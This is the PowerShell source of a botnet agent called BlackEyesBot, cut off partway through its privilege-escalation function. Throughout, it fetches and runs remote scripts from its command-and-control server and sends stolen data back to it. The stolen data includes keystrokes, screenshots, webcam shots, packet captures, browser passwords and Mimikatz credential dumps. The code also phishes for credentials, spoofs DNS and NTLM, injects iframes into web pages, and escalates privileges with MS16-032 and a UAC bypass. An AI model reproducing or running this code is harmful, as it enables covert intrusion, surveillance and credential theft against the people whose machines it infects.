# Cyber Operations with BlackEyesBot, A Powershell agent.
# IMPORTANT ADDITIONAL TODO FEATURES
# - Use Twitter API to get c2c address
# - Use Tor to Hide c2c trafic. use url from tor2web service --> xwxwxwxwxw.onion.to  OR onion.cab ==> exple: [string] $Global:c2c = "https://w27ocke7kskw6cyg.onion.to/pntdr"  
# - Use DNS request instead of HTTP to communicate with c2c by remplacing IEX with NSLOOKUP ==> powershell -ep bypass -nop -c "powershell . ((nslookup.exe -q=txt calc.vincentyiu.co.uk))[5]"
# - Use OLEobject with CVE-2017-0199 for backdooring Word doc instead of using VBS Macro method.
[string] $Global:c2c = "http://127.0.0.1" 
[string] $Global:pc = ""
[string] $Global:scan = "empty"
[string] $Global:usbspreading = "off" 
[string] $Global:EndDat = "ENDDATE"
[string] $Global:regkey = "javafx"
[string] $Global:sleeptime1 = "5"
[string] $Global:sleeptime2 = "10"
[string] $Global:sleeptime3 = "15"
[string] $Global:autopersist = "AUTOPERSIST"
[string] $Global:myencoded = "MYENCODED" 
[string] $Global:c2channel = "C2CHANNEL" # icmp, twitter, dropbox, gmail, dns, http/s
$ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
$devideID = Get-WmiObject win32_networkadapterconfiguration | where {$_.IPAddress -eq $ip} | select SettingID
$w = $ip.split('.')[0]
$x = $ip.split('.')[1]
$y = $ip.split('.')[2]
$z = $ip.split('.')[3]
$StartAddress = "$w.$x.$y.1"
$EndAddress = "$w.$x.$y.254"
# Test PS version and install CurL if the version is lower than 3. Also try to install Choco and update powershell to v3+         R
[string] $Global:pshversion = $PSVersionTable.psversion.Major
if ($pshversion -lt 3) {
	pversion = 2
	$exists = "$env:userprofile\AppData\cl.exe"
	If (Test-Path $exists){		
		} 
	else {
		#choco install curl
		$downloadURL = "$c2c/pntdr/link/cl.txt"
		[string] $FileOnDisk =  "$env:userprofile\cl.txt"
		attrib +h "$env:userprofile\cl.txt"
		if ($downloadURL.Substring(0,5) -ceq "https") {
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
        }
		$WebRequest = [System.Net.Webrequest]::create($downloadURL)
        $WebResponse = $WebRequest.GetResponse()
        $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
        $WebResponse.Close()
        $downloadedScript = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
		#Convert txt to exe
		[string]$hex = get-content -path $FileOnDisk
		[Byte[]] $temp = $hex -split ' '
		[System.IO.File]::WriteAllBytes("$env:userprofile\AppData\cl.exe", $temp) 
		}
		attrib +h "$env:userprofile\AppData\cl.exe"
	#Installation of Chocolatey 
	
	#Choco-Install
	
	}
	
#############################################################
## Action & commands of bot ##	
Function Invoke-Pnt {
	#IEX (New-Object Net.WebClient).DownloadString("$c2c/pntdr/link/portscan.txt")
	#$scan = portscan -StartAddress $StartAddress -EndAddress $EndAddress -ResolveHost -ScanPort | Out-String
    Function Invoke-drn {
        [CmdletBinding()] Param(
        )
		Function sendC2 {
	   		[CmdletBinding()] param( 
			[string]$pc,
			[string]$result,
			[string]$id
			)
			$postParams = @{pc=$pc;result=$result;id=$id}
			if ($pshversion -lt 3) {
			Curl $pc $result $id } else {
			Invoke-WebRequest -Uri "$c2c/pntdr/link/ok.php" -Method POST -Body $postParams
			}
		}
        Function ChangeC2Command {
           [CmdletBinding()] param( 
			[string]$id
			)
			[string] $NewC2C = $LatestOrder.split('|')[1]
            # set pc instance in the new c2c.
			$result = 'Changed !'
			sendC2 $pc $result $id
			$c2c = $NewC2C
			InitializeBot
		}
        Function HelloCommand {
			[CmdletBinding()] param( 
			[string]$id
			)
			$date = Get-Date -Format MM/dd/yyyy-H:mm:ss
			$result = 'Online on $date'
			sendC2 $pc $result $id
            }
		Function HelloOnline {
			$date = Get-Date -Format MM/dd/yyyy-H:mm:ss
			$result = "Hello: $date"
			sendC2 $pc $result $id
            }
		Function QuitCommand {
			# decrypt all files
			# Delete all binaries dropped and folders
			# clean dnsspoof
			# clean persistence (task, wmi, reg, startup)
			# clean log
			# clean registry ID
			# close program
			}
			function Invk-EvtVwrBypass {
				[CmdletBinding()] param( 
				[String]$Command,
				[Switch]$Force
				)
				$command = "IEX (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/Invk-EvtVwrBypass.txt');ModInvkEvtVwrBypass -Command $Command" 
				[string] $CmdPath = "$env:windir\System32\cmd.exe"
				[string] $CmdString = "$CmdPath" + " /C " + "$Command"	
				}    
	# Download & Run command > BEGIN
		Function RunCommand {# !run|calc
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $Command = $LatestOrder.Substring(5)
            [string] $CmdPath = "$env:windir\System32\cmd.exe"
            [string] $CmdString = "$CmdPath" + " /C " + "$Command"
            Invoke-Expression $CmdString
			$result = 'ok'
			sendC2 $pc $result $id
			}
		Function downloadCommand {
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $downloadURL = $LatestOrder.split('|')[1]
            [string] $FileOnDisk =  $LatestOrder.split('|')[2]
            if ($downloadURL.Substring(0,5) -ceq "https") {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            }
			$WebRequest = [System.Net.Webrequest]::create($downloadURL)
            $WebResponse = $WebRequest.GetResponse()
            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
            $WebResponse.Close()
            $downloadedScript = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
			$result = 'ok'
			sendC2 $pc $result $id
			}  
        Function DeployWebShell {
			[CmdletBinding()] param( 
			[string]$id
			)
			#Deploy webshell copy a portable version of ngrok tunneling service, copy a portable version of wampp and install a webshell in wampp
			#This way, we can interactively manage zombie via web
			choco install ngrok.portable
			$result = 'Webshell ready via URL: $webshellurl'
			sendC2 $pc $result $id
            }		
        Function downexecCommand {
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $downloadURL = $LatestOrder.split('|')[1]
            [string] $paramscript = $LatestOrder.split('|')[2]                               
            if ($downloadURL.Substring(0,5) -ceq "https") {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            }
            $WebRequest = [System.Net.WebRequest]::create($downloadURL)
            $WebResponse = $WebRequest.GetResponse()
            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
            $WebResponse.Close()
            $downloadedScript = $WebClientObject.downloadString($ActualdownloadURL)
			$CmdString = 'PowerShell.exe -Exec Bypass -NoL -Com $downloadedScript $paramscript'
            Invoke-Expression $CmdString
			$result = 'ok'
			sendC2 $pc $result $id
        }
	# Spoofing  > BEGIN
		Function DnsSpoofCommand { 
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $entry = $LatestOrder.split('|')[1]
            [string] $clean = $LatestOrder.split('|')[2]
			[string] $CmdPath = "$env:windir\System32\cmd.exe"
            if ($clean -eq "1") {
				[string] $Command = "echo $entry > $env:SystemRoot\System32\drivers\etc\hosts"
				[string] $CmdString = "$CmdPath" + " /C " + "$Command"
				Invk-EvtVwrBypass -Command $Command
				}
			else { 
				[string] $Command = "echo $entry >> $env:SystemRoot\System32\drivers\etc\hosts"
				[string] $CmdString = "$CmdPath" + " /C " + "$Command"
				Invk-EvtVwrBypass -Command $Command }
			$result = (gc "$env:SystemRoot\System32\drivers\etc\hosts" | out-string) 
			sendC2 $pc $result $id
        }
		Function InveighCommand {      # !ntlmspoof
			[CmdletBinding()] param( 
			[string]$id
			)
			if ($IsAdmin -eq $True) {
			$command = "IEX (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/Inveigh.txt');Invoke-Inveigh -FileOutput Y" 
			[string] $CmdPath = "$env:windir\System32\cmd.exe"
            [string] $CmdString = "$CmdPath" + " /C " + "$Command"
            Invoke-Expression $CmdString
			$r1 = ls | findstr "Inveigh-Log" | Out-String
			$r2 = "<a href=$c2c/pntdr/exfil/$pc/Inveigh-Log.txt width=620 height=340>Inveigh-Log.txt</a>"
			$result = "$r1 `n`n $r2"			
			Exfiltrate Inveigh-Log.txt
			} else {
			$result = "Not admin ! Run it with Tater (hotpotatoes attack): !hotpotatoes|$command `n`n !ntlmspoof"
				}
			sendC2 $pc $result $id
			}
		Function WebInjectCommand {    # !webinject|</head>|<iframe src=evil.com></iframe></head>
			[CmdletBinding()] param( 
			[string]$id
			)
			iex (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/interceptor.txt')
			Interceptor -Tamper -SearchString "</head>" -ReplaceString "<iframe src=beefserver.com height=0 width=0></iframe></head>"
			$result = "injected"
			sendC2 $pc $result $id
			}
		Function SniffCommand {
			#content
		}
	# Recon. & scanning  > BEGIN
		Function ReconCommand {
			[CmdletBinding()] param( 
			[string]$id
			)
			$reconfile = "recon"+$pc+".txt"
			$reconfile0 = "$env:userprofile\AppData\"+$reconfile
			$command = "IEX (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/recon.txt');ModReconCommand  | set-content $reconfile0" 
			[string] $CmdPath = "$env:windir\System32\cmd.exe"
			[string] $CmdString = "$CmdPath" + " /C " + "$Command"	
			$result = "$c2c/pntdr/exfil/$pc/$reconfile"
			Exfiltrate $reconfile0
			sendC2 $pc $result $id
			}
		Function ScanCommand {
            [CmdletBinding()] param( 
			[string]$id
			)
			
			#content
			
			sendC2 $pc $result $id
			} 
        Function WannacryCheckCommand {			
			#MS17-010 Wannacry Checker
			[CmdletBinding()] param( 
			[string]$id
			)
			$hotfixes = "KB3205409", "KB3210720", "KB3210721", "KB3212646", "KB3213986", "KB4012212", "KB4012213", "KB4012214", "KB4012215", "KB4012216", "KB4012217", "KB4012218", "KB4012220", "KB4012598", "KB4012606", "KB4013198", "KB4013389", "KB4013429", "KB4015217", "KB4015438", "KB4015546", "KB4015547", "KB4015548", "KB4015549", "KB4015550", "KB4015551", "KB4015552", "KB4015553", "KB4015554", "KB4016635", "KB4019213", "KB4019214", "KB4019215", "KB4019216", "KB4019263", "KB4019264", "KB4019472", "KB4015221", "KB4019474", "KB4015219", "KB4019473"
			$hotfix = Get-HotFix -ComputerName $env:computername | Where-Object {$hotfixes -contains $_.HotfixID} | Select-Object -property "HotFixID"
			if (Get-HotFix | Where-Object {$hotfixes -contains $_.HotfixID})
			{
			$result = "Patched against WannaCry"
			} else {
			$result = "Vulnerability MS17-010 found for WannaCry"
			}
			sendC2 $pc $result $id
		}			
    # Throlling  > BEGIN
		Function VideoCommand { # !video|http://www.youtube.com/watch?v=dQw4w9WgXcQ
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $VideoURL = $LatestOrder.split('|')[1]
            if ($VideoURL -eq $null) {
                [string] $VideoURL = "http://www.youtube.com/watch?v=dQw4w9WgXcQ"
            }
            1..50 | Foreach {
                    $WscriptObject = New-Object -com wscript.shell
                    $WscriptObject.SendKeys([char]175)
                }
            
            [string] $CmdString = "$env:SystemDrive\PROGRA~1\INTERN~1\iexplore.exe $VideoURL"
            Write-Verbose "I am now opening IE to $VideoUrl"
            Invoke-Expression $CmdString
			$result = 'ok'
			sendC2 $pc $result $id
        }
        Function SpeakCommand {
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $AudioMessage = $LatestOrder.split('|')[1]
            
            #Raise the volume to make sure they hear us
            1..50 | Foreach {
                    $WscriptObject = New-Object -com wscript.shell
                    $WscriptObject.SendKeys([char]175)
                }
            
            #Create a COM object to pass the message to
            $ComVoiceObject = New-Object -ComObject SAPI.SpVoice
            Write-Verbose "I should be speaking now"
            [void] $ComVoiceObject.Speak($AudioMessage)
			$result = 'ok'
			sendC2 $pc $result $id
        }            
        Function WallpaperCommand {
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $downloadURL = $LatestOrder.split('|')[1]
            [string] $FileOnDisk =  $LatestOrder.split('|')[2]

            if ($downloadURL.Substring(0,5) -ceq "https") {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            }

            $WebRequest = [System.Net.Webrequest]::create($downloadURL)
            $WebResponse = $WebRequest.GetResponse()
            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
            $WebResponse.Close()
            Write-Verbose "I am downloading from $ActualdownloadURL"
            Write-Verbose "I am saving the file to $FileOnDisk"
            $downloadedImage = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
            Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name wallpaper -Value $FileOnDisk
            [string] $CmdString = 'rundll32.exe user32.dll, UpdatePerUserSystemParameters'
            Invoke-Expression $CmdString
			$result = 'ok'
			sendC2 $pc $result $id
        }
		Function EicarCommand {
            [CmdletBinding()] param( 
			[string]$id
			)
			$command = "IEX(New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/eicar.txt');" 
			[string] $CmdPath = "$env:windir\System32\cmd.exe"
			[string] $CmdString = "$CmdPath" + " /C " + "$Command"
			$result = 'ok'
			sendC2 $pc $result $id
        } 
        Function PopupCommand {
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $PopupMessage = $LatestOrder.split('|')[1]
            [string] $PopupTitle = $LatestOrder.split('|')[2]
            Add-Type -AssemblyName "System.Drawing","System.Windows.Forms"
            [Windows.Forms.MessageBox]::Show($PopupMessage, $PopupTitle, [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Information)
			$result = 'ok'
			sendC2 $pc $result $id
		}
        Function ThunderstruckCommand {
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $VideoURL = $LatestOrder.split('|')[1]
            if ($VideoURL -eq $null) {
                [string] $VideoURL = "http://www.youtube.com/watch?v=v2AC41dglnM"
            }

            $IEComObject = New-Object -com "InternetExplorer.Application"
            $IEComObject.visible = $False
            $IEComObject.navigate($VideoURL)
            $EndTime = (Get-Date).addminutes(3)
            Write-Verbose "Loop will end at $EndTime"
                do {
                    $WscriptObject = New-Object -com wscript.shell
                    $WscriptObject.SendKeys([char]175)
                }
                
                until ((Get-Date) -gt $EndTime)
			$result = 'ok'
			sendC2 $pc $result $id
        }
	# Spy the user  > BEGIN
		Function KeylogCommand {
            [CmdletBinding()] param( 
			[string]$id
			)
			$ScriptBlock = {   
 			$command = "IEX (New-Object Net.WebClient).DownloadString('$c2c/pntdr/klog.txt')" 
			[string] $CmdPath = "$env:windir\System32\cmd.exe"
			[string] $CmdString = "$CmdPath" + " /C " + "$Command"
			}
            Start-job -InitializationScript $ScriptBlock -ScriptBlock {for (;;) {ModLogKey}} | Out-Null
			$result = "ok"	
			sendC2 $pc $result $id
        }       
		Function PacketCaptureCommand { # !packetcapture|10
			[CmdletBinding()] param( 
			[string]$id
			)
			md "$env:userprofile\cap"
            [int32] $CaptureLength = $LatestOrder.split('|')[1]
            [string] $Path = "$env:userprofile\cap" 
            [string] $FileName = [System.Guid]::NewGuid().ToString()
            $FileName = "$FileName.log"
            $EndTime = (Get-Date).addminutes($CaptureLength)
            
            function Capture {
                if ((Test-Path $Path) -eq $False) {
                    try {
                        New-Item $Path -type directory
                    }
                    catch {
                        $Path = "$env:userprofile"
                    }
                }

                $FilePath = (Join-Path $Path $FileName) 

                if ($IsAdmin -eq $True) {
                [string] $CmdString = "netsh trace start capture=yes maxSize=25MB overwrite=yes traceFile=`"$FilePath`""
                Invoke-Expression $CmdString | Out-Null
                }
            }

            function Cleanup {
				[string] $CabFile = ((Get-ChildItem $FilePath).BaseName) + '.cab'
                [string] $CabPath = (Join-Path $Path $CabFile) 
                [string] $StopCmdString = 'netsh trace stop'				
				$result = "$c2c/pntdr/exfil/$pc/$CabFile"			
				Exfiltrate $CabPath
				rd "$env:userprofile\cap" -Recurse
				sendC2 $pc $result $id
				$date = Get-Date -Format MM/dd/yyyy-H:mm:ss
				$postParams2 = @{date=$date;data=$result;pc=$pc;table='screenshot'}
				if ($pshversion -lt 3) {
				Curl_Add $date $result $pc 'screenshot'} else {
				Invoke-WebRequest -Uri "$c2c/pntdr/link/add.php" -Method POST -Body $postParams2 }				
                [string] $CleanCmdString = "del $CabPath"
                Invoke-Expression $StopCmdString | Out-Null
                Invoke-Expression $CleanCmdString
           }
                   
            if ($IsAdmin -eq $True) {
                
                Start-Job -scriptblock {Capture} | Out-Null
            
                do {
                    Start-Sleep -Seconds 1
                }
                
                until ((Get-Date) -gt $EndTime) {
                    Cleanup
                    Start-Sleep -Seconds 10
                    Get-Job | Remove-Job -Force        
                }
            }
			$result = exfiltrate $env:userprofile\cap | Out-String
			sendC2 $pc $result $id
	   }
	   
	   
        Function WebcamCommand {
			[CmdletBinding()] param( 
			[string]$id
			)			
			# Test Path 
			[string] $name = Get-Random -minimum 1 -maximum 999999
			$exists = "$env:userprofile\AppData\cm.exe"
			If (Test-Path $exists){
			# take webcam shot			
			[string] $Command = "$env:userprofile\AppData\cm.exe /filename $name.bmp /delay 10000"
            [string] $CmdPath = "$env:windir\System32\cmd.exe"
            [string] $CmdString = "$CmdPath" + " /C " + "$Command"
            Write-Verbose "cam shot"
            Invoke-Expression $CmdString
			#ls | findstr "$name" | foreach { $path = Resolve-Path $_.FullName ; Exfiltrate $path; $pathlink = "$c2c/pntdr/exfil/$pc/$name";  $result = "$pathlink"; }
			#ls | findstr "$name" | foreach { $path = Resolve-Path $_.FullName ; 
			$name = $name+".bmp"
			Exfiltrate $env:userprofile\$name
			#$result = "$c2c/pntdr/exfil/$pc/$name";
			$result = "$name";
			#$r2 = "<img src=$c2c/pntdr/exfil/$pc/$name.bmp width=620 height=340>$name</img>"
			#$result = "$r1 `n $r2"
			sendC2 $pc $result $id
			}
			else {
			#md "$env:userprofile\cm"
			#attrib +h "$env:userprofile\cm"
			[string] $name = Get-Random -minimum 1 -maximum 9999
			$downloadURL = "$c2c/pntdr/link/cm.txt"
            [string] $FileOnDisk =  "$env:userprofile\AppData\cm.txt"
            if ($downloadURL.Substring(0,5) -ceq "https") {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            }
			$WebRequest = [System.Net.Webrequest]::create($downloadURL)
            $WebResponse = $WebRequest.GetResponse()
            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
            $WebResponse.Close()
            $downloadedScript = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
			#Convert txt to exe
			[string]$hex = get-content -path $FileOnDisk
			[Byte[]] $temp = $hex -split ' '
			[System.IO.File]::WriteAllBytes("$env:userprofile\AppData\cm.exe", $temp)
			attrib +h "$env:userprofile\AppData\cm.exe"
			# take webcam shot			
			[string] $Command = "$env:userprofile\AppData\cm.exe /filename $name.bmp /delay 10000"
            [string] $CmdPath = "$env:windir\System32\cmd.exe"
            [string] $CmdString = "$CmdPath" + " /C " + "$Command"
            Write-Verbose "cam shot"
            Invoke-Expression $CmdString
			ls | findstr "$name" | foreach { $path = Resolve-Path $_.FullName ; Exfiltrate $path; $pathlink = "";  $result = "$result `n  $pathlink "; }
			#$r2 = "<img src=$c2c/pntdr/exfil/$pc/$name.bmp width=620 height=340>$name</img>"
			#$result = "$r1 `n $r2"
			sendC2 $pc $result $id
			#$p = (Resolve-Path .\).Path
			#Exfiltrate "$p\$name"
			#rd "$env:userprofile\cm" -Recurse
			del "$env:userprofile\AppData\cm.exe"
			del "$env:userprofile\AppData\cm.txt"
			del "$env:userprofile\$name"
			del "$env:userprofile\$name.bmp"
				}
			}
		Function ScreenshotCommand {
           [CmdletBinding()] param( 
			[string]$id
			)
			$exists = "$env:userprofile\img"
			If (Test-Path $exists){
			$name = Get-Random -minimum 1 -maximum 999999
			[string] $FilePath = "$env:userprofile\img\$name.png"	
            Add-Type -Assembly System.Windows.Forms
            $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
            $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
            $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
            $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)
            $DrawingGraphics.Dispose()
            $ScreenshotObject.Save($FilePath)
            $ScreenshotObject.Dispose() 
			$r1 = ls | findstr "$name" | Out-String
			$r2 = "<img src=$c2c/pntdr/exfil/$pc/$name.png.png width=620 height=340>$name.png</img>"
			$result = "$r1 `n $r2"			
			Exfiltrate $FilePath			
			sendC2 $pc $result $id
			}
			else {
			md "$env:userprofile\img"
			attrib +h "$env:userprofile\img"
			$name = Get-Random -minimum 1 -maximum 999999
			[string] $FilePath = "$env:userprofile\img\$name.png"	
            Add-Type -Assembly System.Windows.Forms
            $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
            $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
            $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
            $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)
            $DrawingGraphics.Dispose()
            $ScreenshotObject.Save($FilePath)
            $ScreenshotObject.Dispose() 
			$r1 = ls | findstr "$name" | Out-String
			$r2 = "<img src=$c2c/pntdr/exfil/$pc/$name.png.png width=620 height=340>$name.png</img>"
			$result = "$r1 `n $r2"			
			Exfiltrate $FilePath			
			sendC2 $pc $result $id
			}
			$date = Get-Date -Format MM/dd/yyyy-H:mm:ss
			$postParams2 = @{date=$date;data=$result;pc=$pc;table='screenshot'}
			if ($pshversion -lt 3) {
				Curl_Add $date $result $pc 'screenshot' } else {
				Invoke-WebRequest -Uri "$c2c/pntdr/link/add.php" -Method POST -Body $postParams2 }
			rd "$env:userprofile\img" -Recurse
			} 
		Function ScreenStream {
			
			}
        Function GeolocateCommand {
			[CmdletBinding()] param( 
			[string]$id
			)
			if ($pshversion -lt 3) {
				#[xml]$XMLgeo = $env:userprofile\AppData\cl.exe http://ip-api.com/xml
				} 
			else {
				[xml]$XMLgeo = (Invoke-WebRequest http://ip-api.com/xml).Content }
			foreach ($node in @($XMLgeo | Select-Xml -XPath '//lat'))		{
			$lat = $node.Node.InnerText.Trim()
				}
			foreach ($node in @($XMLgeo | Select-Xml -XPath '//lon'))		{
					$lon = $node.Node.InnerText.Trim()
				}
			foreach ($node in @($XMLgeo | Select-Xml -XPath '//country'))		{
					$country = $node.Node.InnerText.Trim()
				}
			foreach ($node in @($XMLgeo | Select-Xml -XPath '//city'))		{
					$city = $node.Node.InnerText.Trim()
				}
			foreach ($node in @($XMLgeo | Select-Xml -XPath '//regionName'))		{
					$region = $node.Node.InnerText.Trim()
				}
			foreach ($node in @($XMLgeo | Select-Xml -XPath '//timezone'))		{
					$timezone = $node.Node.InnerText.Trim()
					}
			foreach ($node in @($XMLgeo | Select-Xml -XPath '//isp'))		{
					$isp = $node.Node.InnerText.Trim()
				}	
			foreach ($node in @($XMLgeo | Select-Xml -XPath '//org'))		{
					$org = $node.Node.InnerText.Trim()
				}	
			foreach ($node in @($XMLgeo | Select-Xml -XPath '//as'))		{
					$as = $node.Node.InnerText.Trim()
				}	
			foreach ($node in @($XMLgeo | Select-Xml -XPath '//query'))		{
					$public_ip = $node.Node.InnerText.Trim()
				}
			$map = "http://maps.google.com/maps/api/staticmap?size=512x512&markers=color:red%7Clabel:Z%7C"+"$lat"+","+"$lon"+"&maptype=hybrid";
			#Start-Process -WindowStyle Hidden "chrome.exe" "$map"
			$result = "GOOGLE MAP: `n <img src=$map>Geolocation map</img> `n PUBLIC IP: $public_ip `n COUNTRY: $country `n CITY: $city `n REGION: $region `n TIMEZONE: $timezone `n ISP: $isp `n ORG: $org `n AS: $as `n ";
			sendC2 $pc $result $id
			}	
		Function GeolocateGPSCommand {
			[CmdletBinding()] param( 
			[string]$id
			)
			Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
			$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
			$GeoWatcher.Start() #Begin resolving current locaton
			while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
				Start-Sleep -Milliseconds 100 #Wait for discovery.
			}  
			if ($GeoWatcher.Permission -eq 'Denied'){
				Write-Error 'Access Denied for Location Information'
			} else {
				$lat = $GeoWatcher.Position.Location | Select Latitude
				$lon = $GeoWatcher.Position.Location | Select Longitude 				
			}
			$map = "http://maps.google.com/maps/api/staticmap?size=512x512&markers=color:red%7Clabel:Z%7C"+"$lat"+","+"$lon"+"&maptype=hybrid";
			$result = "GOOGLE MAP GPS: `n <img src=$map>Geolocation map</img>";
			sendC2 $pc $result $id	
			}
	# Credentials dumping  > BEGIN
		Function CredentialCommand { # !credential   -  creds phishing attempt
            [CmdletBinding()] param( 
			[string]$id
			)
			$UserCredential = Get-Credential  
            $UserCredential.Password | ConvertFrom-SecureString
            $Password = $UserCredential.GetNetworkCredential().Password
            $Username = $UserCredential.UserName
            $ObjectProperties = @{'Username' = $Username;
                                  'Password' = $Password}                             
            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
			$Results = $ResultsObject| out-string
			sendC2 $pc $result $id
		   }
        Function MimikatzCommand {   # !mimikatz -  dump windows pass
			[CmdletBinding()] param( 
			[string]$id
			)
			IEX (New-Object Net.WebClient).DownloadString('https://is.gd/oeoFuI')
			[string] $rs = "" 
			$rs += Invoke-Mimikatz -Command "privilege::debug" | Out-String
			$rs += "`n`n "
			$rs += Invoke-Mimikatz -Command "sekurlsa::logonpasswords" | Out-String
			$rs += "`n`n "
			$rs += Invoke-Mimikatz -DumpCreds
			$rs += "`n`n "
			$rs += Invoke-Mimikatz -Command "sekurlsa::ekeys" | Out-String
			#Invoke-Mimikatz -Command "log sekurlsa.log"
			$rs += "`n`n  ----------------------------------------- "
			$rs += "YOU CAN PASS THE HASH with rc4_hmac_nt, rc4_hmac_old ... : Invoke-Mimikatz -Command sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a"
			$result = $rs
			sendC2 $pc $result $id
			}
        Function RemoteMimikatzCommand {   # !remotemimikatz -  dump windows pass remotely
			[CmdletBinding()] param( 
			[string]$id
			)
			IEX (New-Object Net.WebClient).DownloadString('https://is.gd/oeoFuI')
			[string] $rs = "" 
			$rs += Invoke-Mimikatz -Command "privilege::debug" | Out-String
			$rs += "`n`n "
			$rs += Invoke-Mimikatz -Command "sekurlsa::logonpasswords" | Out-String
			$rs += "`n`n "
			$rs += Invoke-Mimikatz -DumpCreds
			$rs += "`n`n "
			$rs += Invoke-Mimikatz -Command "sekurlsa::ekeys" | Out-String
			#Invoke-Mimikatz -Command "log sekurlsa.log"
			$rs += "`n`n  ----------------------------------------- "
			$rs += "YOU CAN PASS THE HASH with rc4_hmac_nt, rc4_hmac_old ... : Invoke-Mimikatz -Command sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a"
			$result = $rs
			sendC2 $pc $result $id
			}
		Function BrowserDumpCommand { # !browserdump - dump chrome and firefox pass
			[CmdletBinding()] param( 
			[string]$id
			)
			if ($IsAdmin -eq $True) {
			$command = "IEX (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/chr-dump.txt');Get-ChromeDump -OutFile chrpwd.txt" 
			$command2 = "IEX (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/chr-dump.txt');Get-FoxDump -OutFile ffpwd.txt" 
			[string] $CmdPath = "$env:windir\System32\cmd.exe"
            [string] $CmdString = "$CmdPath" + " /C " + "$command"
			[string] $CmdString2 = "$CmdPath" + " /C " + "$command2"
            Invoke-Expression $CmdString
			Invoke-Expression $CmdString2
			$r1 = ls | findstr "chrpwd" | Out-String
			$rr1 = ls | findstr "ffpwd" | Out-String
			$r2 = "<a href=$c2c/pntdr/exfil/$pc/chrpwd.txt width=620 height=340>Chrome-password.txt</a>"
			$rr2 = "<a href=$c2c/pntdr/exfil/$pc/ffpwd.txt width=620 height=340>Firefox-password.txt</a>"
			$result = "$r1 `n`n $r2 `n`n $rr1 `n`n $rr2"			
			Exfiltrate chrpwd.txt
			Exfiltrate ffpwd.txt
			} else {
			$result = "Not admin ! Run it with Tater (hotpotatoes attack): !hotpotatoes|$command `n`n !passdump"
				}
			sendC2 $pc $result $id
		}
	# Privileges escalation  > BEGIN
		Function GetSystemCommand {  # !privesc
			[CmdletBinding()] param( 
			[string]$id
			)
			[String]$rs =""
            if ($IsAdmin -eq $True) {
				IEX (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/token.txt')
				Invoke-TokenManipulation -ImpersonateUser -Username 'nt authority\system'
            }
			else {
			IEX (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/Invoke-MS16-032.txt')
			$rs += "Invoke_MS16_032 :`n`n"
			$rs += Invoke-MS16-032
			$rs += "`n`n  POWERUP - Privesc All Checks : "
			IEX (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/PowerUp.txt')
			$rs += Invoke-AllChecks
			}
			$rs += "`n`n WHO AM I :"
			$result += whoami
			sendC2 $pc $result $id
        }
		Function ElevateCommand {
            [CmdletBinding()] param( 
			[string]$id
			)		
            if ($IsAdmin -eq $False) {
            
                [string] $downloadURL = $LatestOrder.split('|')[1]
                if ($downloadURL.Substring(0,5) -ceq "https") {
                    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
                }
                $WebRequest = [System.Net.WebRequest]::create($downloadURL)
                $WebResponse = $WebRequest.GetResponse()
                $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
                $WebResponse.Close()
            
                Write-Verbose "I am downloading from $ActualdownloadURL"
                $downloadedScript = $WebClientObject.downloadString($ActualdownloadURL)
            
                $CmdArgs = '-Exe Bypass -NoL -Com $downloadedScript'
                $CmdString = 'Start-Process PowerShell.exe -Verb RunAs -ArgumentList ' + '$CmdArgs'
                
                Write-Verbose "I am executing $CmdString"
                Invoke-Expression $CmdString  
			$result ='ok'
			sendC2 $pc $result $id
